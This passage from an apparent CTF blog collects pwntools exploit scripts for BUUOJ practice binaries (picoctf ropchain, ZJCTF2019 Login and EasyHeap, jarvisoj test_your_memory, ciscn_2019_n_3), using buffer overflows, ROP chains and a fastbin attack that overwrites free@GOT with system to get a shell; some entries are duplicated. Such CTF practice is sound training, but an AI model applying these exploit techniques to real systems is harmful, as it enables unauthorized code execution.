class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">11</span> + p64(one[<span class="number">1</span>]+libc_base)+p64(realloc+<span class="number">2</span>)</span><br><span class="line">write(<span class="number">5</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">255</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-47-picoctf-2018-ropchain-solve"><a href="#NO-47-picoctf-2018-ropchain-solve" class="headerlink" title="NO.47 picoctf_2018_ropchain_solve"></a>NO.47 picoctf_2018_ropchain_solve</h1><h3 id="exp-47"><a href="#exp-47" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./picoctf_2018_rop chain&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28416</span>)</span><br><span class="line"><span class="comment">#elf = ELF(&#x27;picoctf_2018_rop chain&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">win1 = <span class="number">0x080485CB</span></span><br><span class="line">win2 = <span class="number">0x080485D8</span></span><br><span class="line">win2_a1 = <span class="number">0xBAAAAAAD</span></span><br><span class="line"></span><br><span class="line">flag = <span class="number">0x0804862B</span></span><br><span class="line">flag_a1 = <span class="number">0xDEADBAAD</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+p32(win1)+p32(win2)+p32(flag)+p32(win2_a1)+p32(flag_a1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;input&gt; &#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-48-ZJCTF2019-Login-solve"><a href="#NO-48-ZJCTF2019-Login-solve" class="headerlink" title="NO.48 [ZJCTF2019]Login_solve"></a>NO.48 [ZJCTF2019]Login_solve</h1><h3 id="exp-48"><a href="#exp-48" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./[ZJCTF 2019]Login&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25051</span>)</span><br><span class="line"><span class="comment">#elf = ELF(&#x27;[ZJCTF 2019]Login&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">shell = <span class="number">0x00400E88</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please enter username: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload = <span class="string">&#x27;2jctf_pa5sw0rd&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">58</span>+p64(shell)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please enter password: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-49-ZJCTF2019-Login-solve"><a href="#NO-49-ZJCTF2019-Login-solve" class="headerlink" title="NO.49 ZJCTF2019_Login_solve"></a>NO.49 ZJCTF2019_Login_solve</h1><h3 id="exp-49"><a href="#exp-49" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./[ZJCTF 2019]Login&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25051</span>)</span><br><span class="line"><span class="comment">#elf = ELF(&#x27;[ZJCTF 2019]Login&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">shell = <span class="number">0x00400E88</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please enter username: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload = <span class="string">&#x27;2jctf_pa5sw0rd&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">58</span>+p64(shell)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please enter password: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-50-jarvisoj-test-your-memory-solve"><a href="#NO-50-jarvisoj-test-your-memory-solve" class="headerlink" title="NO.50 jarvisoj_test_your_memory_solve"></a>NO.50 jarvisoj_test_your_memory_solve</h1><h3 id="exp-50"><a href="#exp-50" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./jarvisoj_test_your_memory&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,)</span><br><span class="line"><span class="comment">#elf = ELF(&#x27;jarvisoj_test_your_memory&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">system = <span class="number">0x080485BD</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;------Test Your Memory!-------\n\n&#x27;</span>)</span><br><span class="line">s2 = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">p.recvuntil(<span class="string">&#x27;what???? : \n&#x27;</span>)</span><br><span class="line">hint = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(s2)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(hint))</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload = s2.ljust(<span class="number">0x13</span>+<span class="number">4</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">payload += p32(system) + p32(hint)+ p32(hint)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-51-ZJCTF2019-EasyHeap-solve"><a href="#NO-51-ZJCTF2019-EasyHeap-solve" class="headerlink" title="NO.51 [ZJCTF2019]EasyHeap_solve"></a>NO.51 [ZJCTF2019]EasyHeap_solve</h1><h3 id="exp-51"><a href="#exp-51" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./[ZJCTF 2019]EasyHeap&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28811</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;[ZJCTF 2019]EasyHeap&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">sla(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">sla(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">sla(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">sla(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">sla(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">sla(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">sla(<span class="string">&quot;Content of heap : &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">sla(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">sla(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">l33t_addr =  <span class="number">0x000400C23</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;aaaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;bbbbb&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;ccccc&#x27;</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x78</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x71</span>)+p64(<span class="number">0x6020b0</span>-<span class="number">3</span>))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;ddddd&#x27;</span>)<span class="comment">#2 </span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;eeeee&#x27;</span>)<span class="comment">#3 ---&gt; 0x6020b0-3</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">43</span> ,<span class="string">&#x27;aaa&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x8</span>,p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="NO-52-ZJCTF2019-EasyHeap-solve"><a href="#NO-52-ZJCTF2019-EasyHeap-solve" class="headerlink" title="NO.52 ZJCTF2019_EasyHeap_solve"></a>NO.52 ZJCTF2019_EasyHeap_solve</h1><h3 id="exp-52"><a href="#exp-52" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./[ZJCTF 2019]EasyHeap&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28811</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;[ZJCTF 2019]EasyHeap&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">sla(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">sla(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">sla(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">sla(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">sla(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">sla(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">sla(<span class="string">&quot;Content of heap : &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">sla(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">sla(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">l33t_addr =  <span class="number">0x000400C23</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;aaaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;bbbbb&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;ccccc&#x27;</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x78</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x71</span>)+p64(<span class="number">0x6020b0</span>-<span class="number">3</span>))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;ddddd&#x27;</span>)<span class="comment">#2 </span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;eeeee&#x27;</span>)<span class="comment">#3 ---&gt; 0x6020b0-3</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">43</span> ,<span class="string">&#x27;aaa&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x8</span>,p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="NO-53-file-change-time"><a href="#NO-53-file-change-time" class="headerlink" title="NO.53 file_change_time"></a>NO.53 file_change_time</h1><h3 id="exp-53"><a href="#exp-53" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">d1 = datetime.datetime.strptime(<span class="string">&#x27;2020-08-01 00:00:00&#x27;</span>, <span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>)</span><br><span class="line">d2 = datetime.datetime.strptime(<span class="string">&#x27;2020-08-30 23:59:59&#x27;</span>, <span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(d1&gt;d2)</span><br><span class="line">path = <span class="string">u&quot;/home/dj/桌面/temp/Buu pwn&quot;</span></span><br><span class="line"><span class="keyword">for</span> root, <span class="built_in">dir</span>, files <span class="keyword">in</span> os.walk(path):</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        full_path = os.path.join(root, file)</span><br><span class="line">        mtime = os.stat(full_path).st_mtime</span><br><span class="line">        time.strftime(<span class="string">&#x27;%Y-%m-%d&#x27;</span>, time.localtime(mtime))</span><br><span class="line">        file_modify_time = time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>, time.localtime(mtime))</span><br><span class="line">        file_modify_time_format = datetime.datetime.strptime(file_modify_time, <span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> file_modify_time_format &gt;= d1 <span class="keyword">and</span> file_modify_time_format &lt;= d2:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&#123;0&#125; 修改时间是: &#123;1&#125;&quot;</span>.<span class="built_in">format</span>(full_path,file_modify_time_format))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-54-ciscn-2019-n-3-solve"><a href="#NO-54-ciscn-2019-n-3-solve" class="headerlink" title="NO.54 ciscn_2019_n_3_solve"></a>NO.54 ciscn_2019_n_3_solve</h1><h3 id="exp-54"><a href="#exp-54" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_2019_n_3&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28300</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_n_3&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = 